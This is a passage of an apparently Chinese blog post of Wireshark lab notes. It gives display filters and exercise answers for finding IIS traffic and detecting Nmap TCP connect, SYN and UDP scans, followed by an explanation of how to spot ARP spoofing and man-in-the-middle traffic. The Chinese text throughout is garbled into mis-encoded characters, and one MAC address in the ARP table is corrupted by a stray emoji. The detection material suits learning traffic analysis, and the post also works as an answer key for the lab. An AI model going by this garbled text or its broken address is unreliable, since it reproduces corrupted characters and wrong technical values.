¹æ®éœ€è¦ä½¿ç”¨å®ƒä»¬ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œç¼–è¾‘ --&gt; é…ç½®é…ç½®æ–‡ä»¶â€</strong> èœå•æˆ– <strong>â€œçŠ¶æ€æ å³ä¸‹è§’ --&gt; é…ç½®æ–‡ä»¶â€</strong> éƒ¨åˆ†æ¥åˆ›å»ºã€ä¿®æ”¹å’Œæ›´æ”¹é…ç½®æ–‡ä»¶ã€‚<br />\n<img alt=\"700\" src=\"https://i-blog.csdnimg.cn/img_convert/2913d40aa10878cc6ec62a3d4550a411.png\" /></p>\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>æŸ¥æ‰¾æ‰€æœ‰ Microsoft IIS æœåŠ¡å™¨ã€‚æœ‰å¤šå°‘ä¸ªæ•°æ®åŒ…å¹¶éžæºè‡ªâ€œç«¯å£ 80â€ï¼Ÿ<br />\nç­›é€‰ï¼š<code>http.server contains \"IIS\" &amp;&amp; tcp.srcport != 80</code></p>\n<pre><code class=\"language-python\">21\n</code></pre>\n<p>æŸ¥æ‰¾æ‰€æœ‰ Microsoft IIS æœåŠ¡å™¨ã€‚ç‰ˆæœ¬å·ä¸ºâ€œ7.5â€çš„æ•°æ®åŒ…æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>http.server contains \"IIS\" &amp;&amp; http.server contains \"7.5\"</code></p>\n<pre><code class=\"language-python\">71\n</code></pre>\n<p>ä½¿ç”¨ç«¯å£ 3333ã€4444 æˆ– 9999 çš„æ•°æ®åŒ…æ€»æ•°æ˜¯å¤šå°‘ï¼Ÿ<br />\nè¿™é‡Œé¢˜ç›®æ²¡æœ‰è¯´æ¸…æ¥šæ˜¯tcpåè®®<br />\nç­›é€‰ï¼š<code>tcp.port in  {3333 4444 9999}</code></p>\n<pre><code class=\"language-python\">2235\n</code></pre>\n<p>TTL å€¼ä¸ºå¶æ•°çš„åŒ…æœ‰å¤šå°‘ä¸ªï¼Ÿ<br />\nç”¨æ­£åˆ™åŒ¹é…å¶æ•°ï¼Œå‰æéœ€è¦å°†ttlè½¬ä¸ºstring<br />\nåŒ¹é…æ¨¡å¼æ˜¯ï¼šä»¥0248ç»“å°¾çš„å°±æ˜¯å¶æ•°äº†<br />\nç­›é€‰ï¼š<code>string(ip.ttl) matches \"[02468]$\"</code></p>\n<pre><code class=\"language-python\">77289\n</code></pre>\n<p>å°†é…ç½®æ–‡ä»¶æ›´æ”¹ä¸ºâ€œæ ¡éªŒå’ŒæŽ§åˆ¶â€ã€‚â€œé”™è¯¯çš„ TCP æ ¡éªŒå’Œâ€æ•°æ®åŒ… æœ‰å¤šå°‘ä¸ªï¼Ÿ<br />\né€‰æ‹©ä¸€ä¸‹è¯¥é…ç½®ï¼š<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ed4f28bfbc79576afbf0189e1eaaa90f.png\" /><br />\nç„¶åŽç¼–è¾‘ä»–ï¼Œä¿®æ”¹ä¸ºï¼š<code>é”™è¯¯çš„ TCP æ ¡éªŒ</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/7a63472aa16654742ac66d8e312371cb.png\" /><br />\nç­›é€‰ï¼š<code>tcp.checksum.status == 0</code></p>\n<pre><code class=\"language-python\">34185\n</code></pre>\n<p>ä½¿ç”¨çŽ°æœ‰çš„è¿‡æ»¤æŒ‰é’®è¿‡æ»¤æµé‡ã€‚æ˜¾ç¤ºçš„åŒ…æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/952fa8c9c1c79e91dea6e40aead984e4.png\" /></p>\n<pre><code class=\"language-python\">261\n</code></pre>\n<h3 id=\"wiresharkæµé‡åˆ†æž\">Wiresharkï¼šæµé‡åˆ†æž</h3>\n<p>æˆ‘ä»¬å°†æ·±å…¥åˆ†æžå¹¶å…³è”æ•°æ®åŒ…çº§ä¿¡æ¯ï¼Œä»Žè€Œäº†è§£ç½‘ç»œæµé‡çš„å…¨è²Œï¼Œä¾‹å¦‚æ£€æµ‹å¼‚å¸¸å’Œæ¶æ„æ´»åŠ¨ã€‚å¯¹äºŽå®‰å…¨åˆ†æžå¸ˆè€Œè¨€ï¼Œè¿ç”¨è‡ªèº«çŸ¥è¯†å’Œå·¥å…·åŠŸèƒ½æ¥æ‹¦æˆªå¹¶ç†è§£æ•°æ®åŒ…ä¸­æ•£å¸ƒçš„ä¿¡æ¯è‡³å…³é‡è¦ã€‚æœ¬èŠ‚è¯¾å°†è®²è§£å¦‚ä½•ç»“åˆåˆ†æžå¸ˆçŸ¥è¯†å’Œ Wireshark çš„åŠŸèƒ½ï¼Œé’ˆå¯¹ç‰¹å®šæ¡ˆä¾‹ï¼Œåˆ†æžæ•°æ®åŒ…çº§ç»†èŠ‚ï¼Œä»Žè€Œæ£€æµ‹å¼‚å¸¸å’Œå¼‚å¸¸æƒ…å†µã€‚</p>\n<h4 id=\"nmapæ‰«æ\">Nmapæ‰«æ</h4>\n<p>Nmapæ˜¯ä¸€æ¬¾ä¸šç•Œæ ‡å‡†çš„ç½‘ç»œæ˜ å°„å·¥å…·ï¼Œç”¨äºŽè¯†åˆ«æ´»åŠ¨ä¸»æœºå’ŒæœåŠ¡ã€‚ä½œä¸ºæœ€å¸¸ç”¨çš„ç½‘ç»œæ‰«æå·¥å…·ä¹‹ä¸€ï¼Œå®‰å…¨åˆ†æžå¸ˆåº”è¯†åˆ«å…¶ç”Ÿæˆçš„ç½‘ç»œæ¨¡å¼ã€‚æœ¬èŠ‚å°†ä»‹ç»æœ€å¸¸è§çš„Nmapæ‰«æç±»åž‹ã€‚</p>\n<ul>\n<li>TCPè¿žæŽ¥æ‰«æ</li>\n<li>SYNæ‰«æ</li>\n<li>UDPæ‰«æ</li>\n</ul>\n<p>äº†è§£Nmapæ‰«æçš„å·¥ä½œåŽŸç†å¯¹äºŽå‘çŽ°ç½‘ç»œä¸Šçš„æ‰«ææ´»åŠ¨è‡³å…³é‡è¦ã€‚ç„¶è€Œï¼Œå¦‚æžœä¸ä½¿ç”¨æ­£ç¡®çš„è¿‡æ»¤å™¨ï¼Œå°±æ— æ³•ç†è§£æ‰«æçš„è¯¦ç»†ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ç”¨äºŽæŽ¢æµ‹ç½‘ç»œä¸Š Nmapæ‰«æè¡Œä¸ºçš„åŸºæœ¬è¿‡æ»¤å™¨ã€‚</p>\n<p><strong>TCPæ ‡å¿—ç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wireshark è¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨å±€æœç´¢ã€‚</td>\n<td>- <code>tcp</code><br /><br />- <code>udp</code></td>\n</tr>\n<tr>\n<td>- ä»… SYN æ ‡å¿—ã€‚<br />- SYN æ ‡å¿—ä½å·²ç½®ä½ã€‚å…¶ä½™ä½å¹¶ä¸é‡è¦ã€‚</td>\n<td>- <code>tcp.flags == 2</code><br /><br />- <code>tcp.flags.syn == 1</code></td>\n</tr>\n<tr>\n<td>- ä»… ACK æ ‡å¿—ã€‚<br />- ACK æ ‡å¿—ä½å·²ç½®ä½ã€‚å…¶ä½™ä½å¹¶ä¸é‡è¦ã€‚</td>\n<td>- <code>tcp.flags == 16</code><br /><br />- <code>tcp.flags.ack == 1</code></td>\n</tr>\n<tr>\n<td>- ä»… SYNã€ACK æ ‡å¿—ã€‚<br />- SYN å’Œ ACK å·²ç½®ä½ã€‚å…¶ä½™ä½å¹¶ä¸é‡è¦ã€‚</td>\n<td>- <code>tcp.flags == 18</code><br /><br />- <code>(tcp.flags.syn == 1) and (tcp.flags.ack == 1)</code></td>\n</tr>\n<tr>\n<td>- ä»…RSTæ ‡å¿—ã€‚<br />- RSTæ ‡å¿—ä½å·²ç½®ä½ã€‚å…¶ä½™ä½å¹¶ä¸é‡è¦ã€‚</td>\n<td>- <code>tcp.flags == 4</code><br /><br />- <code>tcp.flags.reset == 1</code></td>\n</tr>\n<tr>\n<td>- ä»…åŒ…å« RST å’Œ ACK æ ‡å¿—ã€‚<br />- RST å’Œ ACK ä½å·²ç½®ä½ã€‚å…¶ä½™ä½å¹¶ä¸é‡è¦ã€‚</td>\n<td>- <code>tcp.flags == 20</code><br /><br />- <code>(tcp.flags.reset == 1) and (tcp.flags.ack == 1)</code></td>\n</tr>\n<tr>\n<td>- ä»… FIN æ ‡å¿—<br />- FIN æ ‡å¿—å·²ç½®ä½ã€‚å…¶ä½™ä½å¹¶ä¸é‡è¦ã€‚</td>\n<td>- <code>tcp.flags == 1</code><br /><br />- <code>tcp.flags.fin == 1</code></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"tcpè¿žæŽ¥æ‰«æ\">TCPè¿žæŽ¥æ‰«æ</h5>\n<p><strong>TCPè¿žæŽ¥æ‰«æç®€è¿°ï¼š</strong></p>\n<ul>\n<li>ä¾èµ–äºŽä¸‰æ¬¡æ¡æ‰‹ï¼ˆéœ€è¦å®Œæˆæ¡æ‰‹è¿‡ç¨‹ï¼‰ã€‚</li>\n<li>é€šå¸¸ä»¥<code>nmap -sT</code> å‘½ä»¤å½¢å¼æ‰§è¡Œã€‚</li>\n<li>ä¾›éžç‰¹æƒç”¨æˆ·ä½¿ç”¨ï¼ˆéž root ç”¨æˆ·çš„å”¯ä¸€é€‰é¡¹ï¼‰ã€‚</li>\n<li>ç”±äºŽåè®®çš„ç‰¹æ€§ï¼Œè¯·æ±‚é€šå¸¸éœ€è¦ä¸€äº›æ•°æ®ï¼Œå› æ­¤çª—å£å¤§å°é€šå¸¸å¤§äºŽ 1024 å­—èŠ‚ã€‚</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>æ‰“å¼€ TCP ç«¯å£</strong></th>\n<th><strong>æ‰“å¼€ TCP ç«¯å£  <br /></strong></th>\n<th><strong>TCPç«¯å£å·²å…³é—­</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>- åŒæ­¥ --&gt;<br />- &lt;-- SYNï¼ŒACK<br />- ACK --&gt;</td>\n<td>- åŒæ­¥ --&gt;<br />- &lt;-- SYNï¼ŒACK<br />- ACK --&gt;<br />- RSTï¼ŒACK --&gt;</td>\n<td>- åŒæ­¥ --&gt;<br />- &lt;-- RSTï¼ŒACK</td>\n</tr>\n</tbody>\n</table>\n<p>ä¸‹å›¾å±•ç¤ºäº†TCPç«¯å£æ‰“å¼€å’Œå…³é—­çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚ä¸ºäº†ä¾¿äºŽè°ƒæŸ¥å’Œç†è§£æ¯ä¸ªæ¡ˆä¾‹çš„ç»†èŠ‚ï¼Œå›¾ç‰‡å’Œpcapæ ·æœ¬å·²è¢«åˆ†å‰²ã€‚</p>\n<p><strong>æ‰“å¼€ TCP ç«¯å£ï¼ˆè¿žæŽ¥ï¼‰ï¼š</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ddaf7e10988b5ca085771fcad0520794.png\" /><br />\n<strong>TCPç«¯å£å·²å…³é—­ï¼ˆè¿žæŽ¥ï¼‰ï¼š</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/8a7acad1feb90d1efb4a6e03ac9e5cad.png\" /></p>\n<p>ä»¥ä¸Šå›¾åƒå±•ç¤ºäº†å­¤ç«‹æµé‡ä¸­çš„æ¨¡å¼ã€‚ç„¶è€Œï¼Œåœ¨å¤§åž‹æ•èŽ·æ–‡ä»¶ä¸­å‘çŽ°è¿™äº›æ¨¡å¼å¹¶éžæ˜“äº‹ã€‚å› æ­¤ï¼Œåˆ†æžäººå‘˜éœ€è¦ä½¿ç”¨é€šç”¨è¿‡æ»¤å™¨æ¥æŸ¥çœ‹åˆå§‹å¼‚å¸¸æ¨¡å¼ï¼Œç„¶åŽæ›´å®¹æ˜“å°†æ³¨æ„åŠ›é›†ä¸­åœ¨ç‰¹å®šçš„æµé‡ç‚¹ä¸Šã€‚ç»™å®šçš„è¿‡æ»¤å™¨æ˜¾ç¤ºäº†æ•èŽ·æ–‡ä»¶ä¸­çš„ TCP è¿žæŽ¥æ‰«ææ¨¡å¼ã€‚<br />\n<code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &gt; 1024</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/de786e52afce642b5563aa63bad90ba9.png\" /></p>\n<h5 id=\"åŒæ­¥æ‰«æ\">åŒæ­¥æ‰«æ</h5>\n<p><strong>TCP SYN æ‰«æç®€è¿°ï¼š</strong></p>\n<ul>\n<li>ä¸ä¾èµ–äºŽä¸‰æ¬¡æ¡æ‰‹ï¼ˆæ— éœ€å®Œæˆæ¡æ‰‹è¿‡ç¨‹ï¼‰ã€‚</li>\n<li>é€šå¸¸ä»¥ <code>nmap -sS</code> å‘½ä»¤å½¢å¼æ‰§è¡Œã€‚</li>\n<li>ä»…ä¾›ç‰¹æƒç”¨æˆ·ä½¿ç”¨ã€‚</li>\n<li>é€šå¸¸å¤§å°å°äºŽæˆ–ç­‰äºŽ 1024 å­—èŠ‚ï¼Œå› ä¸ºè¯·æ±‚å°šæœªå®Œæˆï¼Œå¹¶ä¸”é¢„è®¡ä¸ä¼šæ”¶åˆ°æ•°æ®ã€‚</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>æ‰“å¼€ TCP ç«¯å£</strong></th>\n<th><strong>å…³é—­ TCP ç«¯å£</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>- åŒæ­¥ --&gt;<br />- &lt;-- åŒæ­¥ï¼Œç¡®è®¤<br />- RST--&gt;</td>\n<td>- åŒæ­¥ --&gt;<br />- &lt;-- RST,ACK</td>\n</tr>\n</tbody>\n</table>\n<p><strong>æ‰“å¼€ TCP ç«¯å£ï¼ˆSYNï¼‰ï¼š</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/b722c8882c43aaba29b1e8ec9ceb2c47.png\" /><br />\n<strong>TCPç«¯å£å·²å…³é—­ï¼ˆSYNï¼‰ï¼š</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c7a7a4f33ee331da26071c5b5907c507.png\" /><br />\nç»™å®šçš„è¿‡æ»¤å™¨æ˜¾ç¤º  æ•èŽ·æ–‡ä»¶ä¸­çš„TCP SYN æ‰«ææ¨¡å¼ã€‚<br />\n<code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &lt;= 1024</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/81758a02fa43ed3d4f2a8c6660cd7ff0.png\" /></p>\n<h5 id=\"udpæ‰«æ\">UDPæ‰«æ</h5>\n<p><strong>UDPæ‰«æç®€è¿°ï¼š</strong></p>\n<ul>\n<li>ä¸éœ€è¦æ¡æ‰‹è¿‡ç¨‹</li>\n<li>æ²¡æœ‰æ‰“å¼€ç«¯å£çš„æç¤º</li>\n<li>ç«¯å£å…³é—­çš„ ICMP é”™è¯¯æ¶ˆæ¯</li>\n<li>é€šå¸¸ä»¥ <code>nmap -sU</code> å‘½ä»¤å½¢å¼æ‰§è¡Œã€‚</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th><strong>æ‰“å¼€UDPç«¯å£</strong></th>\n<th><strong>UDPç«¯å£</strong>å·²<strong>å…³é—­</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>- UDPæ•°æ®åŒ… --&gt;</td>\n<td>- UDPæ•°æ®åŒ… --&gt;<br />- ICMP ç±»åž‹ 3ï¼Œä»£ç  3 æ¶ˆæ¯ã€‚ï¼ˆç›®æ ‡ä¸å¯è¾¾ï¼Œç«¯å£ä¸å¯è¾¾ï¼‰</td>\n</tr>\n</tbody>\n</table>\n<p><strong>å·²å…³é—­ï¼ˆç«¯å£ 69ï¼‰å’Œå·²å¼€æ”¾ï¼ˆç«¯å£ 68ï¼‰çš„ UDPç«¯å£ï¼š</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c17ab70b7afd212bb125a71b2f384f01.png\" /><br />\nä¸Šå›¾æ˜¾ç¤ºï¼Œå…³é—­çš„ç«¯å£è¿”å›žäº†ä¸€ä¸ª ICMP é”™è¯¯æ•°æ®åŒ…ã€‚ä¹ä¸€çœ‹ï¼Œå¹¶æ²¡æœ‰æä¾›å…³äºŽè¯¥é”™è¯¯çš„æ›´å¤šä¿¡æ¯ï¼Œé‚£ä¹ˆåˆ†æžäººå‘˜å¦‚ä½•ç¡®å®šæ­¤é”™è¯¯æ¶ˆæ¯çš„å½’å±žå‘¢ï¼ŸICMP é”™è¯¯æ¶ˆæ¯ä½¿ç”¨åŽŸå§‹è¯·æ±‚ä½œä¸ºå°è£…æ•°æ®æ¥æ˜¾ç¤ºæ•°æ®åŒ…çš„æ¥æº/åŽŸå› ã€‚å±•å¼€æ•°æ®åŒ…è¯¦ç»†ä¿¡æ¯çª—æ ¼ä¸­çš„ ICMP éƒ¨åˆ†åŽï¼Œæ‚¨å°†çœ‹åˆ°å°è£…æ•°æ®å’ŒåŽŸå§‹è¯·æ±‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/7bc1c2b5f17187270131b678a1f7a04d.gif\" /><br />\nç»™å®šçš„è¿‡æ»¤å™¨æ˜¾ç¤ºæ•èŽ·æ–‡ä»¶ä¸­çš„UDPæ‰«ææ¨¡å¼ã€‚<br />\n<code>icmp.type==3 and icmp.code==3</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/0f3b03bd69ab84a1c3e241202f63bcac.png\" /><br />\næ£€æµ‹åˆ†å—æ–‡ä»¶ä¸­çš„å¯ç–‘æ´»åŠ¨å¾ˆå®¹æ˜“ï¼Œä¹Ÿæ˜¯å­¦ä¹ å¦‚ä½•å…³æ³¨ç»†èŠ‚çš„å¥½æ–¹æ³•ã€‚</p>\n<hr />\n<p><strong>çŽ°åœ¨ï¼Œè¯·ä½¿ç”¨è¯¥<code>\"~/Desktop/exercise-pcaps/nmap/Exercise.pcapng\"</code>æ–‡ä»¶ï¼Œå°†æ‚¨çš„æŠ€èƒ½åº”ç”¨äºŽå•ä¸ªæ•èŽ·æ–‡ä»¶ï¼Œå¹¶å›žç­”ä»¥ä¸‹é—®é¢˜ï¼</strong></p>\n<p>TCP è¿žæŽ¥æ‰«æçš„æ€»æ¬¡æ•°æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &gt; 1024</code></p>\n<pre><code class=\"language-python\">1000\n</code></pre>\n<p>æ‰«æ TCP ç«¯å£ 80 ä½¿ç”¨çš„æ˜¯å“ªç§æ‰«æç±»åž‹ï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/1c96318c0fe1f4603f4e1b8059a1a14d.png\" /></p>\n<pre><code class=\"language-python\">TCP Connect\n</code></pre>\n<p>æœ‰å¤šå°‘æ¡â€œUDP å…³é—­ç«¯å£â€æ¶ˆæ¯ï¼Ÿ<br />\nç­›é€‰ï¼š<code>icmp.type == 3 and icmp.code == 3</code></p>\n<pre><code class=\"language-python\">1083\n</code></pre>\n<p>55-70ç«¯å£èŒƒå›´å†…çš„å“ªä¸ªUDPç«¯å£æ˜¯å¼€æ”¾çš„ï¼Ÿ<br />\nç­›é€‰ï¼š<code>udp.port in {55..70}</code><br />\næ³¨æ„ï¼Œè¿™é‡ŒæŸ¥çœ‹çš„æ˜¯ç«¯å£å¼€æ”¾ï¼Œçœ‹ä»–ç›®çš„åœ°ç«¯å£ï¼Œç„¶åŽè¿žæŽ¥æˆåŠŸçš„ï¼Œè€Œä¸æ˜¯çœ‹ä¸ªæ•°å“ˆï¼Œåˆ«æžé”™äº†<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/777826512c79ff412bd1704622705c28.png\" /></p>\n<pre><code class=\"language-python\">68\n</code></pre>\n<h4 id=\"arpæŠ•æ¯’æ”»å‡»å’Œä¸­é—´äººæ”»å‡»\">ARPæŠ•æ¯’æ”»å‡»å’Œä¸­é—´äººæ”»å‡»ï¼</h4>\n<h5 id=\"arpæ¬ºéª—ä¸­å’Œæ”»å‡»åˆç§°ä¸­é—´äººæ”»å‡»\">ARPæ¬ºéª—/ä¸­å’Œæ”»å‡»ï¼ˆåˆç§°ä¸­é—´äººæ”»å‡»ï¼‰</h5>\n<p>ARPåè®®ï¼Œå³åœ°å€è§£æžåè®®ï¼ˆ<strong>ARP</strong>ï¼‰ï¼Œæ˜¯è´Ÿè´£å…è®¸è®¾å¤‡åœ¨ç½‘ç»œä¸­è¯†åˆ«è‡ªèº«èº«ä»½çš„æŠ€æœ¯ã€‚åœ°å€è§£æžåè®®æŠ•æ¯’ï¼ˆä¹Ÿç§°ä¸ºARPæ¬ºéª—æˆ–ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ï¼‰æ˜¯ä¸€ç§æ”»å‡»ï¼Œå®ƒé€šè¿‡å‘é»˜è®¤ç½‘å…³å‘é€æ¶æ„ARPæ•°æ®åŒ…æ¥å¹²æ‰°/æ“çºµç½‘ç»œã€‚å…¶æœ€ç»ˆç›®çš„æ˜¯ç¯¡æ”¹<strong>â€œIPåœ°å€åˆ°MACåœ°å€è¡¨â€</strong>ï¼Œå¹¶å—…æŽ¢ç›®æ ‡ä¸»æœºçš„ç½‘ç»œæµé‡ã€‚</p>\n<p>æœ‰å¾ˆå¤šå·¥å…·å¯ç”¨äºŽå‘èµ·ARPæ”»å‡»ã€‚ç„¶è€Œï¼Œè¿™ç§æ”»å‡»çš„æ€è·¯æ˜¯å›ºå®šçš„ï¼Œå› æ­¤åªè¦äº†è§£ARPåè®®çš„å·¥ä½œæµç¨‹å’ŒWiresharkçš„ä½¿ç”¨æŠ€å·§ï¼Œå°±å¾ˆå®¹æ˜“æ£€æµ‹åˆ°æ­¤ç±»æ”»å‡»ã€‚</p>\n<p><strong>ARPåˆ†æžç®€è¿°ï¼š</strong></p>\n<ul>\n<li>åœ¨æœ¬åœ°ç½‘ç»œä¸Šè¿è¡Œ</li>\n<li>å®žçŽ° MAC åœ°å€ä¹‹é—´çš„é€šä¿¡</li>\n<li>è¿™ä¸æ˜¯ä¸€ä¸ªå®‰å…¨çš„åè®®</li>\n<li>ä¸æ˜¯å¯è·¯ç”±åè®®</li>\n<li>å®ƒæ²¡æœ‰èº«ä»½éªŒè¯åŠŸèƒ½</li>\n<li>å¸¸è§æ¨¡å¼æœ‰è¯·æ±‚ä¸Žå“åº”ã€å…¬å‘Šå’Œå…è´¹æ•°æ®åŒ…ã€‚</li>\n</ul>\n<p>åœ¨è°ƒæŸ¥æµé‡ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€äº›åˆæ³•å’Œå¯ç–‘çš„ARPæ•°æ®åŒ…ã€‚åˆæ³•çš„è¯·æ±‚ç±»ä¼¼äºŽå›¾ä¸­æ‰€ç¤ºï¼šä¸€ä¸ªå¹¿æ’­è¯·æ±‚ï¼Œè¯¢é—®æ˜¯å¦æœ‰å¯ç”¨ä¸»æœºä½¿ç”¨æŸä¸ªIPåœ°å€ï¼Œä»¥åŠæ¥è‡ªä½¿ç”¨è¯¥IPåœ°å€çš„ä¸»æœºçš„å›žå¤ã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å…¨çƒæœç´¢</td>\n<td>- <code>arp</code></td>\n</tr>\n<tr>\n<td><strong>â€œ ARP â€é€‰é¡¹ï¼Œç”¨äºŽèŽ·å–å”¾æ‰‹å¯å¾—çš„æˆæžœï¼š</strong><br /><br />- æ“ä½œç  1ï¼šARPè¯·æ±‚ã€‚<br />- æ“ä½œç  2ï¼šARPå“åº”ã€‚<br />- <strong>äº¨ç‰¹ï¼š</strong>ARPæ‰«æ<br />- <strong>è°ƒæŸ¥ï¼š</strong>å¯èƒ½æ£€æµ‹åˆ°ARPä¸­æ¯’<br />- <strong>æœå¯»ï¼š</strong>å¯èƒ½æ£€æµ‹åˆ°ARPæ³›æ´ªæ”»å‡»ï¼š</td>\n<td>- <code>arp.opcode == 1</code><br /><br />- <code>arp.opcode == 2</code><br /><br />- <code>arp.dst.hw_mac==00:00:00:00:00:00</code><br /><br />- <code>arp.duplicate-address-detected or arp.duplicate-address-frame</code><br /><br />- <code>((arp) &amp;&amp; (arp.opcode == 1)) &amp;&amp; (arp.src.hw_mac == target-mac-address)</code></td>\n</tr>\n</tbody>\n</table>\n<p><strong>ARPè¯·æ±‚</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/a695c22f30fbaefe71dbb258905471d1.png\" /></p>\n<p><strong>ARPåº”ç­”</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d138429f8549a8b09cfb79bbecc14bb1.png\" /><br />\nå¯ç–‘æƒ…å†µæ˜¯æŒ‡é’ˆå¯¹ç‰¹å®š IP åœ°å€å‡ºçŽ°ä¸¤ä¸ªä¸åŒçš„ARPå“åº”ï¼ˆå†²çªï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒWireshark çš„ä¸“å®¶ä¿¡æ¯é€‰é¡¹å¡ä¼šå‘åˆ†æžäººå‘˜å‘å‡ºè­¦å‘Šã€‚ä½†æ˜¯ï¼Œå®ƒåªä¼šæ˜¾ç¤ºé‡å¤å€¼çš„ç¬¬äºŒä¸ªå®žä¾‹ä»¥çªå‡ºæ˜¾ç¤ºå†²çªã€‚å› æ­¤ï¼Œå¦‚ä½•ä»Žåˆæ³•æ•°æ®åŒ…ä¸­è¯†åˆ«æ¶æ„æ•°æ®åŒ…æ˜¯åˆ†æžäººå‘˜é¢ä¸´çš„æŒ‘æˆ˜ã€‚ä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªå¯èƒ½çš„ IP åœ°å€æ¬ºéª—æ¡ˆä¾‹ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/a0419ddb616495622b5c7552affe61f3.png\" /><br />\näº†è§£ç½‘ç»œæž¶æž„å¹¶æ£€æŸ¥ç‰¹å®šæ—¶é—´æ®µå†…çš„æµé‡æœ‰åŠ©äºŽå‘çŽ°å¼‚å¸¸ã€‚ä½œä¸ºåˆ†æžå¸ˆï¼Œæ‚¨åº”è¯¥åœ¨ç»§ç»­ä¸‹ä¸€æ­¥ä¹‹å‰è®°å½•ä¸‹æ‚¨çš„å‘çŽ°ã€‚è¿™å°†æœ‰åŠ©äºŽæ‚¨ä¿æŒæ¡ç†æ¸…æ™°ï¼Œå¹¶ä¾¿äºŽå…³è”åŽç»­å‘çŽ°ã€‚è¯·çœ‹ä¸‹å›¾ï¼›è¿™é‡Œå­˜åœ¨å†²çªï¼›ä»¥â€œb4â€ç»“å°¾çš„MACåœ°å€æž„é€ äº†ä¸€ä¸ªARPè¯·æ±‚ï¼Œå…¶IPåœ°å€ä¸ºâ€œ192.168.1.25â€ï¼Œç„¶åŽå£°ç§°è‡ªå·±æ‹¥æœ‰â€œ192.168.1.1â€çš„IPåœ°å€ã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>æ£€æµ‹è®°å½•</strong></th>\n<th><strong>å‘çŽ°</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>å¯èƒ½å­˜åœ¨åŒ¹é…çš„ IP åœ°å€ã€‚</td>\n<td>1. é€šè¿‡ MAC åœ°å€å…¬å¸ƒçš„ IP åœ°å€ã€‚</td>\n<td>- MACåœ°å€ï¼š00:0c:29:e2:18:b4<br />- IPåœ°å€ï¼š192.168.1.25</td>\n</tr>\n<tr>\n<td>å¯èƒ½æ˜¯ARPæ¬ºéª—æ”»å‡»ã€‚</td>\n<td>ä¸¤ä¸ª MAC åœ°å€å£°ç§°æ‹¥æœ‰åŒä¸€ä¸ª IP åœ°å€ (192.168.1.1)ã€‚IP  <br />åœ°å€â€œ192.168.1.1â€å¯èƒ½æ˜¯ä¸€ä¸ªç½‘å…³åœ°å€ã€‚</td>\n<td>- MAC1: 50:78:b3:f3ðŸ’¿f4<br />- MAC 2: 00:0c:29:e2:18:b4</td>\n</tr>\n<tr>\n<td>å¯èƒ½æ˜¯ARPæ³›æ´ªæ”»å‡»ã€‚</td>\n<td>ä»¥â€œb4â€ç»“å°¾çš„ MAC åœ°å€å£°ç§°æ‹¥æœ‰ä¸åŒçš„/æ–°çš„ IP åœ°å€ã€‚</td>\n<td>- MACåœ°å€ï¼š00:0c:29:e2:18:b4<br />- IPåœ°å€ï¼š192.168.1.1</td>\n</tr>\n</tbody>\n</table>\n<p>æˆ‘ä»¬ç»§ç»­æ£€æŸ¥æµé‡ï¼Œä»¥å‘çŽ°ä»»ä½•å…¶ä»–å¼‚å¸¸æƒ…å†µã€‚è¯·æ³¨æ„ï¼Œä¸ºäº†ä¾¿äºŽè°ƒæŸ¥ï¼Œæ­¤æ¡ˆä¾‹å·²æ‹†åˆ†ä¸ºå¤šä¸ªæ•èŽ·æ–‡ä»¶ã€‚</p>\n<p><img alt=\"\" 